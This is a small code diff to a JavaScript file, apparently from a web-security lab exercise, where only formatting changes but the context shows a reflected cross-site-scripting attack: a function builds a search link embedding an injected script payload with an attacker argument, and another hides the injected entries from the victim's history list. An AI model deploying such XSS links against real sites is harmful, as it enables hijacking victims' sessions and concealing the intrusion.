@@ -44,7 +44,7 @@ function payload(attacker) {
 		}
 		for (var i = 0; i < historyList.length; i++) {
 			if (historyList[i].text.indexOf(injectedCode[0]) != -1) {
-				historyList[i].style.display = 'none';
+				historyList[i].style.display = "none";
 			}
 		}
 	}
@@ -115,7 +115,6 @@ function makeLink(xssdefense, target, attacker) {
 		return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" +
 		encodeURIComponent("<" + scriptTag + ">" + payload.toString() +
 			";payload(\"" + attacker + "\");</" + scriptTag + ">");
-
 	}
 }
 var xssdefense = 1;
